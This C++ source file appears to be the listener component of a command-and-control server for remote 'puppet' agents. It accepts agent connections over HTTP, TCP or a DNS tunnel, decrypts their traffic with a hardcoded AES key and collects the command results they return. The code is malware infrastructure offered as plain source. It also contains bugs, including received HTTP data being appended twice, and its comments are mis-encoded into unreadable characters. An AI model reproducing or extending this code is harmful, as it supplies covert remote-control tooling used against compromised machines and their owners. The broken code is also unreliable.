#include<sstream>
#include <algorithm>

#include "PuppetManager.h"
#include "NetworkUtilities.h"
#include "AES.h"
#include "DNS.h"


// ����������������HTTPͷ����Content-Length
size_t parseContentLength(const std::string& headers) {
    std::istringstream stream(headers);
    std::string line;
    while (std::getline(stream, line)) {
        if (line.find("Content-Length:") != std::string::npos ||
            line.find("content-length:") != std::string::npos) {
            size_t colonPos = line.find(':');
            if (colonPos != std::string::npos) {
                return std::stoul(line.substr(colonPos + 1));
            }
        }
    }
    return 0; // ��δ�ҵ��������ʵ��Э�鴦������ֿ���룩
}

bool isDigits(const std::string& s) {
    return !s.empty() && std::all_of(s.begin(), s.end(), ::isdigit);
}

void PuppetHandle(int clientID, SOCKET puppetSocket, ServerManager* serverManager, ClientConnectionManager& instance) {
    
    const size_t MAX_BUFFER_SIZE = 10 * 1024 * 1024; // 10MB�ڴ�����
    std::string key = "weiweiSecretKey123!";
    std::string accumulatedData;
    bool isHeadersParsed = false;
    size_t contentLength = 0;
    size_t bodyStartPos = 0;

    // ��ȡЭ������
    std::string protocol = instance.getClient(clientID)->getProtocol();

    sendPuppetInfo(instance);

    while (instance.getGRunning()) {
        char buffer[BUFFER_SIZE];
        int bytesReceived = recv(puppetSocket, buffer, BUFFER_SIZE - 1, 0);

        if (bytesReceived > 0) {
            buffer[bytesReceived] = '\0';
            accumulatedData.append(buffer, bytesReceived);

            if (protocol == "http") {
                // HTTP�����ֲ���...
                // HTTPЭ�鴦������ͷ����������
                accumulatedData.append(buffer, bytesReceived);

                if (!isHeadersParsed) {
                    size_t headerEnd = accumulatedData.find("\r\n\r\n");
                    if (headerEnd != std::string::npos) {
                        std::string headers = accumulatedData.substr(0, headerEnd);
                        bodyStartPos = headerEnd + 4;
                        contentLength = parseContentLength(headers);
                        isHeadersParsed = true;
                    }
                }

                if (isHeadersParsed && (accumulatedData.size() - bodyStartPos >= contentLength)) {
                    std::string responseBody = accumulatedData.substr(bodyStartPos, contentLength);
                    accumulatedData.erase(0, bodyStartPos + contentLength);

                    std::string decrypted = Encrypt::decodeByAES(responseBody, key);
                    if (!decrypted.empty()) {
                        serverManager->setCmdList(decrypted, false);
                    }

                    if (decrypted.substr(0, 4) == "byby")
                    {
                        instance.removeClient(clientID);
                        sendPuppetInfo(instance);
                    }

                    // ����״̬
                    accumulatedData.clear();
                    isHeadersParsed = false;
                    contentLength = 0;
                    bodyStartPos = 0;
                }
            }
            else if (protocol == "tcp") {
                // ����������ǰ׺��TCP����
                while (true) {
                    // ����ð�ŷָ���
                    size_t colonPos = accumulatedData.find(':');
                    if (colonPos == std::string::npos) break;

                    // ��������ֵ
                    std::string lengthStr = accumulatedData.substr(0, colonPos);
                    if (!isDigits(lengthStr)) { // ��֤�Ƿ�Ϊ������
                        safePrint("�Ƿ�����ֵ:", lengthStr);
                        accumulatedData.clear();
                        break;
                    }

                    size_t dataLength = 0;
                    try {
                        dataLength = static_cast<size_t>(std::stoul(lengthStr));
                    }
                    catch (...) {
                        safePrint("����ת��ʧ��:", lengthStr);
                        accumulatedData.clear();
                        break;
                    }

                    // �������������
                    size_t totalNeeded = colonPos + 1 + dataLength;
                    if (accumulatedData.size() < totalNeeded) break;

                    // ��ȡ��������
                    std::string encrypted = accumulatedData.substr(
                        colonPos + 1,
                        dataLength
                    );

                    // ���ܴ���
                    try {
                        std::string decrypted = Encrypt::decodeByAES(encrypted, key);
                        if (!decrypted.empty()) {
                            serverManager->setCmdList(decrypted, false);
                        }

                        if (decrypted.substr(0, 4) == "byby")
                        {
                            instance.removeClient(clientID);
                            sendPuppetInfo(instance);
                        }
                    }
                    catch (const std::exception& e) {
                        safePrint("����ʧ��:", e.what());
                    }

                    // �Ƴ��Ѵ�������
                    accumulatedData.erase(0, totalNeeded);
                }

                // �ڴ汣������
                if (accumulatedData.size() > MAX_BUFFER_SIZE) {
                    safePrint("������������������");
                    accumulatedData.clear();
                }
            }
        }
        else if (bytesReceived <= 0) {
            // �Ͽ�����...
            instance.setGRunning(false);
        }
    }

    closesocket(puppetSocket);
    WSACleanup();
}

//�ú�����ʱδʹ��
void PuppetDnsHandle(int clientID,SOCKET puppetSocket, sockaddr_in puppetAddr,int puppetLen, ServerManager* serverManager, ClientConnectionManager& instance) {

    DNSHeader header{};
    header.id = htons(0x1234);
    header.flags = htons(0x8180);
    TunnelRequest request;
    TunnelResponse response;

    DNS dns(header, request, response);

    std::vector<uint8_t> buffer(512);
    sockaddr_in clientAddr;
    int clientLen = sizeof(clientAddr);

    sendPuppetInfo(instance);

    while (instance.getGRunning()) {

        // ������Ӧ
        sockaddr_in responseAddr{};
        auto responseFrags = dns.receiveFragmentsServer2Client(puppetSocket, responseAddr);

        std::string cmdResult = dns.assembleFragments(responseFrags);

        if (!cmdResult.empty()) {
            serverManager->setCmdList(cmdResult, false);
        }
    }

    closesocket(puppetSocket);
    WSACleanup();
}

// ������ܶ�����
void HandlePuppet(SOCKET listenSocket_puppet, 
    ServerManager* serverManager, 
    ClientConnectionManager& instance,
    std::string protocol,
    std::string port) 
{
    while (instance.getGRunning()) {
        sockaddr_in clientAddr{};
        int clientAddrSize = sizeof(clientAddr);
        SOCKET puppetSocket = accept(listenSocket_puppet, (sockaddr*)&clientAddr, &clientAddrSize);

        if (puppetSocket == INVALID_SOCKET) {

            safePrint("��������ʧ��!!!", WSAGetLastError());

            continue;
        }

        char clientIP[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, &clientAddr.sin_addr, clientIP, INET_ADDRSTRLEN);

        {
            safePrint("���յ����ܶ�����, IP: ", clientIP, ":", ntohs(clientAddr.sin_port));
        }

        // ��������ʼ�� ClientInfo ����
        sockaddr_in clientSock;
        memset(&clientSock, 0, sizeof(clientSock));
        int clientID = clientAndPuppetConnectionDeal(instance, clientIP, puppetSocket, clientSock, false, protocol,std::to_string(ntohs(clientAddr.sin_port)));

        // �����̴߳�����ܶ�
        std::thread puppetThread(PuppetHandle, clientID, puppetSocket, serverManager, std::ref(instance));
        puppetThread.detach();
    }
}

void HandleDnsPuppet(SOCKET listenSocket_puppet, ServerManager* serverManager, ClientConnectionManager& instance, std::string protocol,std::string port) {
    
    DNSHeader header{};
    header.id = htons(0x1234);
    header.flags = htons(0x8180);
    TunnelRequest request;
    TunnelResponse response;

    DNS dns(header, request, response);

    std::vector<uint8_t> buffer(512);
    sockaddr_in clientAddr;
    int clientLen = sizeof(clientAddr);

    int recvLen = recvfrom(listenSocket_puppet, (char*)buffer.data(), buffer.size(), 0,
        (sockaddr*)&clientAddr, &clientLen);

    if (recvLen <= 0) {

        std::cerr << WSAGetLastError() << std::endl;
    }

    // ��ȡ���ܶ˷��͵ĺ���
    std::string query = dns.extractQueryData(buffer);

    char clientIP[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, &clientAddr.sin_addr, clientIP, INET_ADDRSTRLEN);

    {
        safePrint("���յ����ܶ˺���, IP: ", clientIP, ":", ntohs(clientAddr.sin_port));
    }

    // ��������ʼ�� ClientInfo ����
    int clientID = clientAndPuppetConnectionDeal(instance, clientIP, listenSocket_puppet, clientAddr, false, protocol,std::to_string(ntohs(clientAddr.sin_port)));
    
    sendPuppetInfo(instance);

    // ������Ӧ
    sockaddr_in responseAddr{};

    while (instance.getGRunning()) {

        auto responseFrags = dns.receiveFragmentsServer2Client(listenSocket_puppet, responseAddr);

        std::string cmdResult = dns.assembleFragments(responseFrags);

        // ֻ�е�cmdResult�ǿ������ٰ���һ���ɼ��ַ�ʱִ��
        if (!cmdResult.empty() &&
            std::any_of(cmdResult.begin(), cmdResult.end(), [](char c) {
                return std::isprint(static_cast<unsigned char>(c));
                }))
        {
            serverManager->setCmdList(cmdResult, false);

            if (cmdResult.substr(0, 4) == "byby")
            {
                instance.removeClient(clientID);
                sendPuppetInfo(instance);
            }
        }

        //����udp�����ӵ����ԣ�ʵ�ֶ���ܴ���������⣬��ʱ��������һ�����ܶ�
        // �����̴߳�����ܶ�
        /*std::thread puppetThread(PuppetDnsHandle, clientID, listenSocket_puppet, clientAddr, clientLen, serverManager, std::ref(instance));
        puppetThread.detach();*/
    }
}


void puppetListenerCreate(std::string command, ServerManager* serverManager, ClientConnectionManager& instance) {
    
    struct  ListenerItem
    {
        std::string name;
        std::string protocol;
        std::string ip;
        std::string port;
    };
    ListenerItem listenerItems;
    std::vector<std::string> Items;
    std::string item = "";
    std::istringstream inputStream(command);

    while (std::getline(inputStream, item, ':')) {
        Items.push_back(item);
    }

    listenerItems.name    = Items[1];
    listenerItems.protocol = Items[2];
    listenerItems.ip      = Items[3];
    listenerItems.port    = Items[4];

    SOCKET listenSocket_puppet = INVALID_SOCKET;

    if (listenerItems.protocol.substr(0, 3) == "dns") {
        
        //����udp������
        listenSocket_puppet = CreateDnsListenSocket(listenerItems.ip.c_str(), static_cast<USHORT>(std::stoi(listenerItems.port.c_str())));
        std::thread puppetThread(HandleDnsPuppet, listenSocket_puppet, serverManager, std::ref(instance), listenerItems.protocol,listenerItems.port);
        puppetThread.detach();
    }
    else
    {
        //����tcp������
        listenSocket_puppet = CreateListenSocket(listenerItems.ip.c_str(), static_cast<USHORT>(std::stoi(listenerItems.port.c_str())));
        std::thread puppetThread(HandlePuppet, listenSocket_puppet, serverManager, std::ref(instance),listenerItems.protocol,listenerItems.port);
        puppetThread.detach();
    }
}